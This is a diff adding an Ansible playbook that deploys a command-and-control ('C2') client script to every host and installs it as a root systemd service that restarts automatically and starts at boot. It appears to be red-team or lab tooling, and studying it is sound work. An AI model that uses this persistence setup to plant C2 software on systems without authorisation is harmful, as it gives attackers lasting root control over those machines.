@@ -1,0 +1,66 @@
+---
+- name: Deploy C2 Client
+  hosts: all
+  become: true
+  tasks:
+
+    - name: Ensure Python3 is installed
+      apt:
+        name: python3
+        state: present
+      when: ansible_os_family == 'Debian'
+
+    - name: Ensure Python3 pip is installed
+      apt:
+        name: python3-pip
+        state: present
+      when: ansible_os_family == 'Debian'
+
+
+    - name: Ensure working directory exists
+      file:
+        path: /opt/client
+        state: directory
+        owner: root
+        group: root
+        mode: '0755'
+
+    - name: Copy the C2 client script to the remote machine
+      copy:
+        src: C2Client.py
+        dest: /opt/client/C2client.py
+        owner: root
+        group: root
+        mode: '0755'
+
+    - name: Create the systemd service file for the C2 client
+      copy:
+        content: |
+          [Unit]
+          Description=C2 Client
+          After=network.target
+
+          [Service]
+          Type=simple
+          ExecStart=/usr/bin/python3 /opt/client/C2client.py
+          Restart=always
+          User=root
+          WorkingDirectory=/opt/client
+          StandardOutput=journal
+          StandardError=journal
+
+          [Install]
+          WantedBy=multi-user.target
+        dest: /etc/systemd/system/c2client.service
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Reload systemd to apply the new service
+      command: systemctl daemon-reload
+
+    - name: Enable the C2 client service
+      systemd:
+        name: c2client.service
+        enabled: true
+        state: started
